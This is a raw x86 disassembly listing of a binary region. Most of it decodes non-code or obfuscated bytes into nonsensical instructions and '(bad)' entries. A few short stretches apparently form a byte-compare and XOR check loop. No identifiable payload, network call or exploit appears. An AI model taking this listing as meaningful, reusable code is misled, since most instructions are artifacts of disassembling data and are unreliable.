  408161:	mov    edi,0x52c9b52e
  408166:	dec    edx
  408167:	ins    BYTE PTR es:[edi],dx
  408168:	mov    esi,0xe9ed8d4d
  40816d:	xchg   esp,eax
  40816e:	jne    0x408176
  408170:	and    DWORD PTR [edx],ecx
  408172:	(bad)  
  408173:	rol    BYTE PTR [ebp-0x31656541],cl
  408179:	mov    al,ds:0x2b8c97a5
  40817e:	mov    cl,0x26
  408180:	jge    0x40813a
  408182:	lahf   
  408183:	in     eax,dx
  408184:	jnp    0x4081c6
  408186:	or     DWORD PTR [esi+0x42],0x23209b9c
  40818d:	icebp  
  40818e:	push   ebp
  40818f:	into   
  408190:	aas    
  408191:	or     BYTE PTR [edx-0xb],0x95
  408195:	dec    edi
  408196:	dec    edi
  408197:	scas   eax,DWORD PTR es:[edi]
  408198:	push   ebp
  408199:	pop    esi
  40819a:	mov    ebp,gs
  40819c:	mov    cl,0x8
  40819e:	dec    eax
  40819f:	pop    edx
  4081a0:	sub    BYTE PTR [eax],al
  4081a2:	fdiv   DWORD PTR [ebx+esi*1]
  4081a5:	inc    ebp
  4081a6:	xor    esi,DWORD PTR [eax-0x7438f9c2]
  4081ac:	das    
  4081ad:	imul   esp,DWORD PTR [ecx],0x25
  4081b0:	std    
  4081b1:	and    DWORD PTR [ecx],ebx
  4081b3:	push   ss
  4081b4:	stos   DWORD PTR es:[edi],eax
  4081b5:	int3   
  4081b6:	mov    ecx,0xd6c2b7cc
  4081bb:	and    BYTE PTR [edx+0x3c],bl
  4081be:	jbe    0x4081a6
  4081c0:	retf   0x12c5
  4081c3:	outs   dx,DWORD PTR ds:[esi]
  4081c4:	iret   
  4081c5:	(bad)  
  4081c6:	push   0xfffffff2
  4081c8:	stc    
  4081c9:	xchg   edi,eax
  4081ca:	into   
  4081cb:	mov    edx,0x41f7cb5b
  4081d0:	xchg   BYTE PTR ds:0xf9f5a107,dl
  4081d6:	sub    al,dh
  4081d8:	jl     0x4081c7
  4081da:	cdq    
  4081db:	imul   esp,DWORD PTR [edx+0x4944dbc7],0x8446cda3
  4081e5:	iret   
  4081e6:	daa    
  4081e7:	mov    cl,0x55
  4081e9:	into   
  4081ea:	data16 sbb ch,BYTE PTR [edx*1-0x3c5e1c69]
  4081f2:	test   al,0xbe
  4081f4:	(bad)  
  4081f5:	mov    edx,0xcfbd321f
  4081fa:	(bad)  
  4081fb:	imul   ebp,DWORD PTR [bp+di-0x131d],0xffffffca
  408201:	test   BYTE PTR [edi+0x15],bh
  408204:	std    
  408205:	pop    esi
  408206:	bound  edx,QWORD PTR [esi]
  408208:	ror    ecx,1
  40820a:	mov    al,ds:0xe360752c
  40820f:	(bad)  
  408210:	pop    ds
  408211:	ds jg  0x4081ae
  408214:	dec    esp
  408215:	and    dh,BYTE PTR [eax+0x20ccd39e]
  40821b:	iret   
  40821c:	dec    esp
  40821d:	test   dh,0x1b
  408220:	cmp    BYTE PTR [edx],ah
  408222:	jmp    edi
  408224:	pop    ebp
  408225:	cmc    
  408226:	ins    BYTE PTR es:[edi],dx
  408227:	dec    edx
  408228:	push   ecx
  408229:	xor    al,0xe2
  40822b:	or     eax,0xbd816586
  408230:	mov    ebx,0x8dcdfabd
  408235:	cdq    
  408236:	xchg   ebx,eax
  408237:	ins    BYTE PTR es:[edi],dx
  408238:	cs ret 
  40823a:	xor    edx,edi
  40823c:	mov    al,ds:0xbdd8870a
  408241:	sbb    al,0x8c
  408243:	adc    eax,0x135b920d
  408248:	pop    ecx
  408249:	out    dx,eax
  40824a:	pop    esi
  40824b:	pop    ss
  40824c:	shr    BYTE PTR [edi+esi*1+0x7a],1
  408250:	shl    BYTE PTR [edi+edi*2],0x5c
  408254:	xchg   BYTE PTR [edx+eax*1-0x3adfd301],bl
  40825b:	retf   
  40825c:	xlat   BYTE PTR ds:[ebx]
  40825d:	shl    BYTE PTR [ebx-0x60ccb196],1
  408263:	dec    edx
  408264:	frstor [ebx+0x7a1aaaf]
  40826a:	lahf   
  40826b:	test   DWORD PTR [edi],esi
  40826d:	fnstsw WORD PTR [ebp*8-0x2e563698]
  408274:	fiadd  WORD PTR [eax+0x2e07a05]
  40827a:	inc    ecx
  40827b:	test   BYTE PTR [eax],0x52
  40827e:	push   edi
  40827f:	and    DWORD PTR ss:[ebp+0xc49f63],0x6
  408287:	mov    bl,0xec
  408289:	add    ebx,DWORD PTR [ebx+0x2c]
  40828c:	ja     0x4082c4
  40828e:	xor    eax,0x23020044
  408293:	jmp    0x2e47919f
  408298:	enter  0x58a8,0x2
  40829c:	sbb    al,0x52
  40829e:	push   edx
  40829f:	stos   DWORD PTR es:[edi],eax
  4082a0:	stos   DWORD PTR es:[edi],eax
  4082a1:	sub    bh,BYTE PTR [eax-0x19]
  4082a4:	and    BYTE PTR [eax-0x7c],ch
  4082a7:	pushf  
  4082a8:	(bad)  
  4082a9:	and    BYTE PTR [eax-0x359618e3],al
  4082af:	call   0x324cff16
  4082b4:	stos   DWORD PTR es:[edi],eax
  4082b5:	jae    0x40824a
  4082b7:	adc    BYTE PTR [ecx],bh
  4082b9:	xchg   esi,eax
  4082ba:	adc    al,0x33
  4082bc:	iret   
  4082bd:	arpl   WORD PTR [edx],si
  4082bf:	ss dec ebp
  4082c1:	jmp    DWORD PTR [edx-0xb]
  4082c4:	adc    ecx,DWORD PTR [ecx-0x4d]
  4082c7:	jg     0x40824d
  4082c9:	mov    WORD PTR [edi],gs
  4082cb:	adc    ebp,DWORD PTR [eax+0x7fe4cbd6]
  4082d1:	sbb    al,0x15
  4082d3:	arpl   WORD PTR [ecx+ebp*2],di
  4082d6:	jns    0x408315
  4082d8:	cmp    bh,BYTE PTR [ebp+0x6d85a9ab]
  4082de:	int3   
  4082df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082e0:	and    bl,dh
  4082e2:	sub    BYTE PTR [esi+esi*2-0x4abae886],0x53
  4082ea:	mov    bl,0x14
  4082ec:	jnp    0x4082f8
  4082ee:	(bad)  
  4082ef:	sbb    esp,DWORD PTR [ebp+0x37b67527]
  4082f5:	add    esi,DWORD PTR [edi]
  4082f7:	cmp    DWORD PTR [ebp+0x5b],esi
  4082fa:	lds    esi,FWORD PTR [esi-0x51]
  4082fd:	fs aas 
  4082ff:	out    dx,eax
  408300:	mov    bh,0xd9
  408302:	ins    BYTE PTR es:[edi],dx
  408303:	daa    
  408304:	sbb    DWORD PTR [eax-0x17a0f467],ebx
  40830a:	mov    ebx,0x52edb181
  40830f:	or     DWORD PTR [eax+0x75eead3f],esp
  408315:	sbb    DWORD PTR cs:[ebx],esp
  408318:	inc    ecx
  408319:	push   cs
  40831a:	in     al,dx
  40831b:	xor    cl,BYTE PTR [edi+0x37]
  40831e:	or     BYTE PTR [ecx-0x8caa9c2],ah
  408324:	push   es
  408325:	jecxz  0x408341
  408327:	xchg   edi,eax
  408328:	cmp    DWORD PTR [ebp+0x564f385f],edi
  40832e:	(bad)  
  40832f:	aam    0x87
  408331:	jo     0x40833a
  408333:	sbb    BYTE PTR [ebp+0x79],0x2b
  408337:	out    dx,eax
  408338:	in     eax,dx
  408339:	retf   
  40833a:	les    eax,FWORD PTR [esi]
  40833c:	les    ebx,FWORD PTR [esi+0x24a0d0fc]
  408342:	mov    ds:0xfaf3c82b,al
  408347:	xor    ebx,DWORD PTR [edi]
  408349:	sub    al,0xd6
  40834b:	mov    ds:0x65693f59,al
  408350:	push   ss
  408351:	jo     0x4083c5
  408353:	inc    ecx
  408354:	dec    ecx
  408355:	dec    ecx
  408356:	sbb    BYTE PTR [eax+0x3d],bh
  408359:	pop    eax
  40835a:	cmp    BYTE PTR [eax-0x7a],dh
  40835d:	retf   0x3d01
  408360:	push   ebp
  408361:	stc    
  408362:	push   cs
  408363:	stos   DWORD PTR es:[edi],eax
  408364:	add    esi,DWORD PTR [esi-0x29]
  408367:	popf   
  408368:	js     0x40836f
  40836a:	aad    0x4e
  40836c:	inc    eax
  40836d:	shr    eax,cl
  40836f:	push   ebp
  408370:	ins    BYTE PTR es:[edi],dx
  408371:	aam    0xf0
  408373:	int    0xe2
  408375:	jne    0x40838d
  408377:	sbb    DWORD PTR [ebx+eax*2-0x3d],edx
  40837b:	adc    eax,0xeb5670e0
  408380:	mov    WORD PTR [eax-0x4],cs
  408383:	cli    
  408384:	cld    
  408385:	jne    0x408342
  408387:	mov    esp,0x66b455b2
  40838c:	inc    eax
  40838d:	cmp    eax,0x56870bca
  408392:	sub    al,BYTE PTR [ebx]
  408394:	and    eax,0xd706a5e8
  408399:	push   0xffffffa4
  40839b:	xchg   ebp,eax
  40839c:	pop    ds
  40839d:	outs   dx,DWORD PTR ds:[esi]
  40839e:	xchg   ebp,eax
  40839f:	inc    eax
  4083a0:	push   edx
  4083a1:	fldcw  WORD PTR [eax+0x32e268a2]
  4083a7:	cli    
  4083a8:	jge    0x40837e
  4083aa:	xor    DWORD PTR [ebx+ebp*8],edx
  4083ad:	pop    eax
  4083ae:	out    dx,al
  4083af:	mov    cl,BYTE PTR [ebx+0x2c4e0fa1]
  4083b5:	lea    eax,[esi-0x32]
  4083b8:	popf   
  4083b9:	mul    BYTE PTR [ebx-0x120c775d]
  4083bf:	sub    eax,0x2bc71a01
  4083c4:	cld    
  4083c5:	mov    edx,0xcfa3d71c
  4083ca:	sar    BYTE PTR [ebx+0x2c],cl
  4083cd:	inc    edx
  4083ce:	in     al,dx
  4083cf:	loopne 0x4083fe
  4083d1:	xchg   ebx,eax
  4083d2:	in     eax,dx
  4083d3:	shl    DWORD PTR ds:0xfe841d3e,1
  4083d9:	jnp    0x408378
  4083db:	ficomp DWORD PTR ds:0xd47567a0
  4083e1:	adc    DWORD PTR [ebp+0x12afa67c],ecx
  4083e7:	jnp    0x4083b3
  4083e9:	sub    al,0x4
  4083eb:	stc    
  4083ec:	je     0x408378
  4083ee:	inc    esp
  4083ef:	add    eax,0xff558aa8
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi+0x5963b938],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x4083ef
  408448:	in     al,0x96
  40844a:	sub    cl,bh
  40844c:	cmp    al,0x6f
  40844e:	mov    ebp,0x20ec9f92
  408453:	push   ebx
  408454:	adc    ebx,esi
  408456:	retf   
  408457:	adc    edx,ecx
  408459:	and    esp,ecx
  40845b:	push   ecx
  40845c:	jno    0x4083f6
  40845e:	gs stc 
  408460:	cwde   
  408461:	add    edi,DWORD PTR [eax+eax*2-0x2a801117]
  408468:	pop    eax
  408469:	cmp    al,0x38
  40846b:	adc    al,0x3d
  40846d:	xor    eax,0x8ab4410b
  408472:	popa   
  408473:	xchg   edi,eax
  408474:	mov    dh,0x21
  408476:	xlat   BYTE PTR ds:[ebx]
  408477:	or     BYTE PTR [ecx+0x24],bh
  40847a:	xor    BYTE PTR [eax-0x46],0x39
  40847e:	and    al,0x11
  408480:	push   esp
  408481:	ror    BYTE PTR [eax],0xea
  408484:	dec    edx
  408485:	mov    al,0x34
  408487:	lea    edx,[esi+0x46]
  40848a:	or     al,0xc0
  40848c:	pop    ebp
  40848d:	pushf  
  40848e:	into   
  40848f:	jle    0x4084fe
  408491:	fstp   QWORD PTR [ebx-0x729fbf0a]
  408497:	in     eax,dx
  408498:	icebp  
  408499:	scas   eax,DWORD PTR es:[edi]
  40849a:	pop    ss
  40849b:	mov    al,ds:0x11114d63
  4084a0:	jmp    0xc60f27ac
  4084a5:	loop   0x4084e6
  4084a7:	and    edi,DWORD PTR [edi]
  4084a9:	xor    DWORD PTR [edx+0x6c1a9d7b],esi
  4084af:	enter  0xca63,0x3a
  4084b3:	add    ecx,edi
  4084b5:	arpl   WORD PTR [ebx+0x6ffb2ab1],si
  4084bb:	loop   0x408525
  4084bd:	(bad)  
  4084be:	in     al,0x8f
  4084c0:	mov    ds:0x463d4f55,eax
  4084c5:	loop   0x408458
  4084c7:	popa   
  4084c8:	mov    WORD PTR [ebx-0x56ec89a5],?
  4084ce:	or     ecx,ecx
  4084d0:	jle    0x408507
  4084d2:	xchg   edx,eax
  4084d3:	ss sbb ah,bh
  4084d6:	cmp    eax,DWORD PTR [eax]
  4084d8:	test   BYTE PTR ds:0x5039bfa,dh
  4084de:	out    0x22,eax
  4084e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084e1:	sub    ch,BYTE PTR [edi+0x21]
  4084e4:	fsub   QWORD PTR ds:0xb4f26f31
  4084ea:	xchg   BYTE PTR [esp+ebx*2+0x13],dl
  4084ee:	or     BYTE PTR [ebp+0x7b],dh
  4084f1:	pop    ebp
  4084f2:	push   0x7800c50f
  4084f7:	inc    ebx
  4084f8:	(bad)  
  4084fa:	loop   0x4084a0
  4084fc:	scas   eax,DWORD PTR es:[edi]
  4084fd:	dec    esi
  4084fe:	es call 0xd86b:0x4ff1d6c7
  408506:	mov    BYTE PTR [eax],dh
  408508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408509:	and    al,0x2a
  40850b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40850d:	cmp    dl,al
  40850f:	dec    ebp
  408510:	leave  
  408511:	xchg   ebx,eax
  408512:	push   es
  408513:	xlat   BYTE PTR ds:[ebx]
  408514:	cmp    BYTE PTR [ecx],bl
  408516:	sbb    edi,DWORD PTR [ecx]
  408518:	sahf   
  408519:	outs   dx,BYTE PTR ds:[esi]
  40851a:	pop    esp
  40851b:	sbb    BYTE PTR [ebx],0x89
  40851e:	fsub   QWORD PTR [ebx+0x5]
  408521:	xor    DWORD PTR [esi],edi
  408523:	push   esi
  408524:	(bad)
  408527:	rol    DWORD PTR [edi+0x5c],0xfa
  40852b:	and    eax,0x70aded13
  408530:	and    DWORD PTR [edx-0x59],ebp
  408533:	and    DWORD PTR [ebp-0x3d7b7fb7],esi
  408539:	sub    al,0x37
  40853b:	mov    WORD PTR [ecx],fs
  40853d:	push   esp
  40853e:	lods   eax,DWORD PTR ds:[esi]
  40853f:	inc    edx
  408540:	dec    ebp
  408541:	mov    bl,0xd5
  408543:	or     eax,0x6e3c36b7
  408548:	add    DWORD PTR [esi-0xf],edx
  40854b:	shl    DWORD PTR [edx],1
  40854d:	pop    esi
  40854e:	cmp    al,0xe6
  408550:	cmc    
  408551:	adc    eax,0x954f2be2
  408556:	xor    ecx,DWORD PTR [ecx+ecx*4]
  408559:	aam    0x36
  40855b:	pop    ecx
  40855c:	icebp  
  40855d:	cmp    cl,BYTE PTR [edi]
  40855f:	dec    ecx
  408560:	adc    edx,ecx
  408562:	or     dh,BYTE PTR [edx]
  408564:	int    0xba
  408566:	pop    edx
  408567:	xor    bl,cl
  408569:	ds js  0x4085ea
  40856c:	bound  edx,QWORD PTR [eax+0x548aaf6a]
  408572:	xchg   esp,eax
  408573:	leave  
  408574:	repnz and bh,BYTE PTR [ebx-0x1]
  408578:	test   al,0x75
  40857a:	dec    esi
  40857b:	pop    ds
  40857c:	mov    bl,BYTE PTR [ebx-0x7543daaf]
  408582:	sub    eax,0xc74f7072
  408587:	xor    bh,cl
  408589:	mov    BYTE PTR [ebp+0x7684798b],0x9d
  408590:	inc    edx
  408591:	rcl    DWORD PTR fs:[ebp-0x78],1
  408595:	jmp    0x29bd:0x966764a6
  40859c:	dec    edx
  40859d:	pop    esi
  40859e:	or     al,0xb1
  4085a0:	fcomip st,st(5)
  4085a2:	(bad)  
  4085a3:	std    
  4085a4:	dec    ecx
  4085a5:	pop    es
  4085a6:	sbb    BYTE PTR [ebp-0x283678c4],ah
  4085ac:	jge    0x40860a
  4085ae:	test   eax,0x61db45eb
  4085b3:	leave  
  4085b4:	nop
  4085b5:	mov    cl,0x59
  4085b7:	adc    ecx,edi
  4085b9:	stc    
  4085ba:	mov    eax,0x6c9a36ff
  4085bf:	aas    
  4085c0:	and    al,0xbf
  4085c2:	push   ss
  4085c3:	dec    edi
  4085c4:	lock fisttp DWORD PTR [ecx+0x632f53b0]
  4085cb:	sub    DWORD PTR [esi+0x6470af8b],edx
  4085d1:	or     BYTE PTR [edi+0xf30781e],bl
  4085d7:	inc    edi
  4085d8:	add    al,0xd9
  4085da:	rcr    bh,cl
  4085dc:	cmp    esi,DWORD PTR [ebx]
  4085de:	loop   0x4085fb
  4085e0:	pop    ebp
  4085e1:	mov    DWORD PTR [ebx-0x17],ebp
  4085e4:	jne    0x408652
  4085e6:	mov    ds:0x14ebaeac,al
  4085eb:	ds ss pop ebp
  4085ee:	fld    QWORD PTR [ecx-0x1aaf3102]
  4085f4:	mov    al,ds:0x5b676a4e
  4085f9:	cmp    eax,0xf8b988b5
  4085fe:	and    al,0x4b
  408600:	iret   
  408601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408602:	(bad)  [esi-0x71561a1a]
  408608:	xchg   ebp,eax
  408609:	xchg   dh,ch
  40860b:	ja     0x4085ed
  40860d:	in     eax,0x36
  40860f:	pop    esi
  408610:	jns    0x4085c3
  408612:	add    esi,DWORD PTR [ecx-0x1d5d1a90]
  408618:	ins    BYTE PTR es:[edi],dx
  408619:	jmp    0x4085d2
  40861b:	jg     0x408612
  40861d:	jno    0x408621
  40861f:	push   ebp
  408620:	das    
  408621:	cs int3 
  408623:	das    
  408624:	into   
  408625:	std    
  408626:	mov    ebp,ebp
  408628:	fxch   st(7)
  40862a:	xchg   BYTE PTR [ecx-0x5096cdd5],ch
  408630:	or     ebp,0x8663a062
  408636:	hlt    
  408637:	fdiv   DWORD PTR [ebx+ebx*4+0x22]
  40863b:	out    0xa1,eax
  40863d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40863e:	push   ss
  40863f:	mov    esp,DWORD PTR [esi-0x5501d9b]
  408645:	in     al,0xb3
  408647:	cmp    BYTE PTR [edx+0x4a14db9b],dh
  40864d:	inc    esi
  40864e:	jns    0x4085dd
  408650:	or     eax,0x93e1ead8
  408655:	add    eax,0xe8d4694b
  40865a:	enter  0x925,0x6b
  40865e:	sub    ebp,DWORD PTR [edx]
  408660:	fst    st(3)
  408662:	(bad)  
  408663:	ds aas 
  408665:	(bad)  
  408666:	xor    al,0x71
  408668:	retf   0xd147
  40866b:	or     eax,0x2f5d2ff3
  408670:	out    0x2d,eax
  408672:	pop    es
  408673:	or     BYTE PTR [esi],dl
  408675:	int3   
  408676:	cmp    BYTE PTR [esi+0x54f0ebc5],cl
  40867c:	dec    edx
  40867d:	je     0x408690
  40867f:	fwait
  408680:	stos   DWORD PTR es:[edi],eax
  408681:	xlat   BYTE PTR ds:[ebx]
  408682:	xlat   BYTE PTR ds:[ebx]
  408683:	(bad)  
  408684:	xlat   BYTE PTR ds:[ebx]
  408685:	xchg   DWORD PTR [ecx],ecx
  408687:	pop    es
  408688:	idiv   BYTE PTR [ebp-0x4a]
  40868b:	jae    0x40863a
  40868d:	loopne 0x4086f9
  40868f:	add    DWORD PTR [eax-0x7c],eax
  408692:	push   cs
  408693:	sub    al,0x4c
  408695:	mov    cl,0x29
  408697:	or     al,BYTE PTR [edx+0x6a1e284e]
  40869d:	stos   DWORD PTR es:[edi],eax
  40869e:	push   ss
  40869f:	jp     0x4086d7
  4086a1:	cdq    
  4086a2:	pop    esi
  4086a3:	push   ebx
  4086a4:	fisub  WORD PTR [eax]
  4086a6:	sbb    BYTE PTR [edi+0x32],dl
  4086a9:	adc    eax,DWORD PTR [ebp+edi*8-0x2fd5ffed]
  4086b0:	sub    al,0xc9
  4086b2:	or     dh,BYTE PTR [ebx]
  4086b4:	mov    edx,0x69178b06
  4086b9:	les    ebx,FWORD PTR [edx+0x25a78d95]
  4086bf:	and    eax,0xcebe9e56
  4086c4:	pop    ebp
  4086c5:	daa    
  4086c6:	retf   0xf7fe
  4086c9:	xchg   BYTE PTR [eax-0x1278ce02],bh
  4086cf:	inc    esi
  4086d0:	mov    bh,0xa
  4086d2:	mov    ds:0x255b42b2,eax
  4086d7:	ins    BYTE PTR es:[edi],dx
  4086d8:	repnz xor DWORD PTR [edx-0x35],edx
  4086dc:	mov    eax,ds:0xcd7b3c50
  4086e1:	mov    bh,0x2a
  4086e3:	pop    esp
  4086e4:	xchg   esp,eax
  4086e5:	pop    ecx
  4086e6:	inc    edi
  4086e7:	mov    esp,0x1a3ed024
  4086ec:	repnz cmp eax,0xacf745af
  4086f2:	push   ebp
  4086f3:	inc    edx
  4086f4:	jmp    0xe4716c8b
  4086f9:	add    ah,BYTE PTR [edx-0x2a]
  4086fc:	(bad)  
  4086fd:	and    ecx,DWORD PTR [ebx]
  4086ff:	clc    
  408700:	cli    
  408701:	iret   
  408702:	lds    esi,FWORD PTR [ebx-0x51]
  408705:	call   0xde465f15
  40870a:	ins    BYTE PTR es:[edi],dx
  40870b:	sbb    al,0x82
  40870d:	out    0xf9,eax
  40870f:	xchg   ecx,eax
  408710:	xchg   ebx,eax
  408711:	pop    ds
  408712:	xchg   DWORD PTR [edx],edx
  408714:	es mov ebx,0xcfaf9bf0
  40871a:	lds    eax,FWORD PTR [edx+0x3d]
  40871d:	mov    BYTE PTR [ebx],bh
  40871f:	inc    esp
  408720:	push   eax
  408721:	push   edi
  408722:	mov    ds:0xb24f20ea,eax
  408727:	jl     0x4086ae
  408729:	cdq    
  40872a:	or     edx,DWORD PTR [ebp+ebx*4+0x40]
  40872e:	test   DWORD PTR [eax],ebp
  408730:	jmp    DWORD PTR [ebx+edx*4-0x7617ba73]
  408737:	inc    ebp
  408738:	in     al,dx
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	test   al,0xe3
  40877a:	sbb    ecx,esp
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x408792
  408784:	ficom  DWORD PTR [edi]
  408786:	jnp    0x408720
  408788:	jl     0x4087c8
  40878a:	fistp  WORD PTR [ebx+0x7c49de3]
  408790:	cmc    
  408791:	xlat   BYTE PTR ds:[ebx]
  408792:	jno    0x4087bc
  408794:	dec    eax
  408795:	or     BYTE PTR [edi+edi*8-0x37],0x63
  40879a:	push   cs
  40879b:	mov    BYTE PTR [esi],dl
  40879d:	push   ebx
  40879e:	pop    esp
  40879f:	inc    ebx
  4087a0:	(bad)  
  4087a1:	mov    al,ds:0xa3708ce5
  4087a6:	retf   0x531e
  4087a9:	sub    esp,DWORD PTR [eax+eiz*2+0x9da6c0e]
  4087b0:	fs test al,0x91
  4087b3:	push   ebp
  4087b4:	mov    ds:0x49a4c321,al
  4087b9:	test   BYTE PTR [ecx],ah
  4087bb:	add    BYTE PTR [edx],ah
  4087bd:	cli    
  4087be:	not    BYTE PTR [edi]
  4087c0:	adc    bl,dl
  4087c2:	test   eax,0x85024724
  4087c7:	mov    BYTE PTR [edx-0x53ba8034],cl
  4087cd:	push   ebp
  4087ce:	add    DWORD PTR [edx],ebp
  4087d0:	iret   
  4087d1:	jecxz  0x40884a
  4087d3:	fstp   DWORD PTR [edi+0x53]
  4087d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087d7:	and    eax,0x7f20e5df
  4087dc:	std    
  4087dd:	xor    eax,0x89631e15
  4087e2:	lds    ecx,FWORD PTR [edx]
  4087e4:	fnstenv [esi-0x3d]
  4087e7:	fsubr  st(0),st
  4087e9:	mov    ah,0x2f
  4087eb:	push   esp
  4087ec:	mov    dl,0x23
  4087ee:	ds in  al,0x2f
  4087f1:	(bad)  
  4087f2:	jl     0x40884c
  4087f4:	(bad)  
  4087f5:	jp     0x40879e
  4087f7:	sbb    al,0xfe
  4087f9:	shl    DWORD PTR [esi+0x6e],cl
  4087fc:	sub    al,BYTE PTR [esi]
  4087fe:	cmp    esp,DWORD PTR [eax]
  408800:	push   cs
  408801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408802:	add    DWORD PTR [esi+0xa],0x81bc53ed
  408809:	xor    ebp,esp
  40880b:	outs   dx,DWORD PTR ds:[esi]
  40880c:	retf   
  40880d:	div    DWORD PTR [eax+0x2a255aee]
  408813:	mov    bh,cl
  408815:	pop    esi
  408816:	cmc    
  408817:	scas   al,BYTE PTR es:[edi]
  408818:	push   cs
  408819:	cli    
  40881a:	push   edi
  40881b:	test   DWORD PTR [ebp+0xef5eb1c],ebx
  408821:	xor    bh,bh
  408823:	pop    ebx
  408824:	mov    eax,ds:0x34f33f75
  408829:	fistp  WORD PTR [ecx-0x2bc9fcf1]
  40882f:	or     dl,BYTE PTR [edx]
  408831:	adc    dh,BYTE PTR [ebp-0x14cf2ded]
  408837:	sub    eax,0xb704a5d0
  40883c:	jl     0x40887c
  40883e:	icebp  
  40883f:	(bad)  
  408840:	pop    ecx
  408841:	push   ss
  408842:	fild   DWORD PTR [eax+0x2]
  408845:	lds    eax,FWORD PTR [edi+0x3dd73487]
  40884b:	or     cl,bl
  40884d:	fs mov ebx,0x4eeb5260
  408853:	scas   eax,DWORD PTR es:[edi]
  408854:	test   BYTE PTR [esi-0x13704c2e],0x43
  40885b:	(bad)  
  40885c:	pop    ds
  40885d:	xchg   ebx,eax
  40885e:	xor    bl,BYTE PTR [eax]
  408860:	fld    QWORD PTR [esi+0x6e]
  408863:	hlt    
  408864:	fsubp  st(1),st
  408866:	or     eax,0x582f8572
  40886b:	sub    al,0xb4
  40886d:	sub    eax,0xc04b1e5f
  408872:	jle    0x408825
  408874:	std    
  408875:	or     al,0x43
  408877:	pop    ebx
  408878:	scas   al,BYTE PTR es:[edi]
  408879:	fucomi st,st(0)
  40887b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40887c:	xor    dh,BYTE PTR [ebp-0x52658f3c]
  408882:	jge    0x4088e9
  408884:	or     DWORD PTR [edi-0x452bde73],eax
  40888a:	(bad)  
  40888b:	pop    edi
  40888c:	loop   0x408907
  40888e:	stc    
  40888f:	aas    
  408890:	or     al,0xeb
  408892:	das    
  408893:	sbb    DWORD PTR [edx-0x1],esi
  408896:	mov    ah,0x8d
  408898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408899:	sub    DWORD PTR [ecx+0x2f07ee38],0x37e87681
  4088a3:	mov    eax,0xc96de794
  4088a8:	push   esi
  4088a9:	or     DWORD PTR [ebp+ebx*2+0x5950fd6f],esp
  4088b0:	xchg   BYTE PTR [ebp-0x15],ah
  4088b3:	sbb    BYTE PTR [eax+0x734eda50],bh
  4088b9:	test   al,0x60
  4088bb:	fisttp QWORD PTR [ecx]
  4088bd:	mov    ebp,0xa5103238
  4088c2:	ins    DWORD PTR es:[edi],dx
  4088c3:	pusha  
  4088c4:	cmp    ch,bl
  4088c6:	es stos DWORD PTR es:[edi],eax
  4088c8:	arpl   WORD PTR [ecx-0x3b],di
  4088cb:	xchg   ebx,eax
  4088cc:	pop    eax
  4088cd:	scas   eax,DWORD PTR es:[edi]
  4088ce:	push   ss
  4088cf:	(bad)  
  4088d0:	jmp    0x408870
  4088d2:	lods   al,BYTE PTR ds:[esi]
  4088d3:	mov    ah,dh
  4088d5:	(bad)  
  4088d6:	bnd jp 0x4088dd
  4088d9:	and    edx,ebp
  4088db:	(bad)  
  4088dc:	pop    edi
  4088dd:	mov    ah,0xca
  4088df:	cmc    
  4088e0:	shl    ebp,1
  4088e2:	sub    bh,BYTE PTR [esi-0x3c]
  4088e5:	daa    
  4088e6:	out    dx,eax
  4088e7:	push   ds
  4088e8:	repz cli 
  4088ea:	cdq    
  4088eb:	dec    edx
  4088ec:	ss out 0x53,al
  4088ef:	or     al,0xe6
  4088f1:	fyl2x  
  4088f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088f4:	inc    esp
  4088f5:	out    dx,al
  4088f6:	lahf   
  4088f7:	mul    DWORD PTR [edx-0x2]
  4088fa:	icebp  
  4088fb:	call   0xa5e2b4f4
  408900:	bound  esp,QWORD PTR [eax-0x6e]
  408903:	(bad)  
  408904:	loop   0x408960
  408906:	cmp    al,0x85
  408908:	cs in  eax,dx
  40890a:	jmp    0xaf96:0x338a0988
  408911:	mov    WORD PTR [ebx+0x73],?
  408914:	push   ebx
  408915:	inc    ebx
  408916:	mov    al,ds:0x2791809a
  40891b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
